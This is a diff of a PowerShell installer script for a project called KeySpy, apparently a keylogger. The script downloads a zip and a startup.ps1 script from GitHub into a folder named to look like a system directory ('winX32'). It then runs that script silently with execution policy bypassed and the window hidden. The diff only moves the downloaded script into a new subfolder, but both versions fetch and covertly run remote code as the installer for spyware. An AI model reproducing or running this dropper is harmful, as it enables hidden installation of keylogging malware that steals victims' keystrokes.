@@ -13,10 +13,15 @@ $zipUrl = "https://github.com/3rr0r-505/KeySpy/archive/a5792dc2827315c5451856714
 
 # Define the destination folder
 $destinationFolder = "C:\Program Files (x86)\winX32"
+$destinationPSFolder = "C:\Program Files (x86)\winX32\psScript"
 
 # Create the destination folder if it doesn't exist
 if (-not (Test-Path -Path $destinationFolder)) {
     New-Item -ItemType Directory -Path $destinationFolder | Out-Null
+}
+
+if (-not (Test-Path -Path $destinationPSFolder)) {
+    New-Item -ItemType Directory -Path $destinationPSFolder | Out-Null
 }
 
 # Download the zip file
@@ -34,10 +39,10 @@ Remove-Item -Path "$destinationFolder\$($extractedFolder.Name)" -Recurse -Force
 Remove-Item "$destinationFolder\KeySpy.zip" -Force
 
 # Download the startup.ps1 file and save it in the same folder
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/startup.ps1" -OutFile "$destinationFolder\startup.ps1" -UseBasicParsing
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/startup.ps1" -OutFile "$destinationPSFolder\startup.ps1" -UseBasicParsing
 
 # Execute the startup.ps1 script silently
-Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$destinationFolder\startup.ps1'" -NoNewWindow -Wait
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$destinationPSFolder\startup.ps1'" -NoNewWindow -Wait
 
 Write-Host "Initial script execution completed successfully."
 
